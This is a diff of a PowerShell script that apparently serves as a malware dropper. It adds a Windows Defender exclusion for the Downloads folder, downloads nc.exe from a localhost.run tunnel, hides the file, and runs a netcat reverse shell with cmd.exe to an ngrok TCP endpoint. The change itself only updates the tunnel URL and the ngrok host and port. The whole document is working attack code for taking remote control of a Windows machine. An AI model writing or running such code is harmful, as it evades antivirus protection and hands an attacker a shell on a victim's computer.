@@ -13,7 +13,7 @@ try {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
 
     # === Download nc.exe from localhost.run ===
-    $ncUrl = "https://fa6da83cede24a.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
+    $ncUrl = "https://f178e9760b642b.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
     $ncPath = "$env:USERPROFILE\Downloads\nc.exe"
 
     Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
@@ -22,7 +22,7 @@ try {
     Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
     # === Execute nc.exe reverse shell to Ngrok ===
-    & "$ncPath" "4.tcp.ngrok.io" 15652 -e cmd.exe
+    & "$ncPath" "0.tcp.ngrok.io" 17482 -e cmd.exe
 }
 catch {
     Write-Error "Execution failed: $_"
